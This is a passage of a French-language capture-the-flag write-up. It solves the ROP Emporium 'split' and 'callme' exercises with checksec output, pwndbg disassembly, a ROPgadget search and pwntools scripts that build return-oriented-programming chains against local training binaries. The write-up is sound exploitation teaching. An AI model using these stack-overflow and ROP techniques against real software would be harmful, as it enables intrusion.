<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./split&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004007c3</span>)
</span></span><span style="display:flex;"><span>cat_flag <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x601060</span>)
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040074b</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> pop_rdi_ret <span style="color:#f92672">+</span> cat_flag <span style="color:#f92672">+</span> system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Et maintenant, on le lance:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png" alt="2023-01-14-155456_1115x137_scrot"></p>
<p>On a notre flag, gg !</p>
<hr>
<h1 id="callme">
  callme
  <a href="#callme" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h2 id="note-2">
  Note
  <a href="#note-2" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Troisi√®me exo de ROPEmporium, un peu plus court que les deux pr√©c√©dents puisqu&rsquo;il reprend des concepts qu&rsquo;on conna√Æt d√©j√† donc pas trop de difficult√©. Par contre un petit probl√®me au niveau de la consigne il me semble.</p>
<p>Si j&rsquo;ai fait des erreurs, n&rsquo;h√©sitez pas √† me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite √† regarder <a href="#ret2win">le premier exercice</a>.</p>
<h2 id="file-information-2">
  File information
  <a href="#file-information-2" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Avant de commencer √† regarder dans l&rsquo;executable, il faut savoir √† quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">callme</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">callme</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">e8e49880bdcaeb9012c6de5f8002c72d8827ea4c</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer √† un executable en 64bit, link√© dynamiquement et qui n&rsquo;est pas stripp√©
Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">callme</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/callme_x64/callme&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le pr√©c√©dent, <strong>NX</strong> est activ√© donc pas de shellcode, mais ce n&rsquo;est pas un probl√®me puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation-2">
  Exploitation
  <a href="#exploitation-2" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Voici la description:</p>
<pre tabindex="0"><code>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d 
e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. 

For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
</code></pre><p>On peut quand m√™me le lancer et voir ce qu&rsquo;il fait:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png" alt="2023-01-15-150610_1072x508_scrot"></p>
<p>Comme pour le pr√©c√©dent, on voit qu&rsquo;on peut overflow le buffer en envoyant un nombre cons√©quent de bytes. D√©sassemblons le <code>main</code> pour voir plus clairement ce qu&rsquo;il se passe:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400847</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400848</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040084b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20081e</span>]        <span style="color:#75715e"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400852</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400857</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040085c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400861</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400864</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400730</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400869</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4009c8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040086e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400873</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4009df</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400878</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040087d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400882</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400898</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400887</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4009e7</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040088c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400891</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400896</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:	pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400897</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Comme d&rsquo;habitude, il fait appel √† la fonction <code>pwnme</code>, d√©sassemblons-la elle aussi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400898</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400899</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040089c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400700</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x4009f0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008bb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400a13</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ca</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006e0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008cf</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:	mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400710</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400a16</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ea</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:	leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On voit donc que la fonction <code>read</code> va lire <code>0x200</code> bytes puis les stocker dans un buffer de <code>0x20</code> bytes, ce qui est largement suffisant pour l&rsquo;overflow et faire ce qu&rsquo;on veut.</p>
<p>Maintenant, il nous faut les adresses des trois fonctions callme, pour les trouver, on peut par exemple utiliser <code>pwndbg</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a8</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006d0</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e0</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006f0</span>  callme_three<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400700</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400710</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400720</span>  callme_one<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400730</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400740</span>  callme_two<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400750</span>  exit<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400790</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007a0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400810</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400840</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400847</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400898</span>  pwnme
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004008f2</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400940</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b4</span>  _fini
</span></span></code></pre></div><p>On voit que:</p>
<ul>
<li>callme_one est situ√©e √† <code>0x00400720</code></li>
<li>callme_two est situ√©e √† <code>0x00400740</code></li>
<li>callme_three est situ√©e √† <code>0x004006f0</code></li>
</ul>
<p>Maintenant, il nous faut un gadget qui va pop <code>rdi</code>, <code>rsi</code> et <code>rdx</code> puisque ce sont les registres utilis√©s pour les 3 premiers arguments
(cf. <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">linux calling convention stack frame</a>)</p>
<p>On va utiliser ROPgadget pour le trouver:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; pop rsi ; pop rdx&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span> : pop rdi ; pop rsi ; pop rdx ; ret
</span></span></code></pre></div><p>On a notre gadget, et on peut totalement l&rsquo;utiliser 3 fois pour chaque fonction, donc pas besoin d&rsquo;en trouver deux autres.</p>
<p>R√©capitulons avant de commencer notre exploit:</p>
<ul>
<li>On peut commencer √† r√©ecrire la sauvegarde de <code>rip</code> en entrant 40 bytes dans l&rsquo;input</li>
<li>On peut mettre les valeurs qu&rsquo;on veut dans <code>rdi</code>, <code>rsi</code> et <code>rdx</code> gr√¢ce √† notre gadget</li>
<li>On peut appeller chaque fonction une par une avec les arguments qu&rsquo;on veut</li>
</ul>
<p>Tr√®s bien, commen√ßons notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump √† la fonction callme_one</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump √† callme_two</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
</span></span></code></pre></div><p>Testons le pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png" alt="2023-01-15-152741_1107x131_scrot"></p>
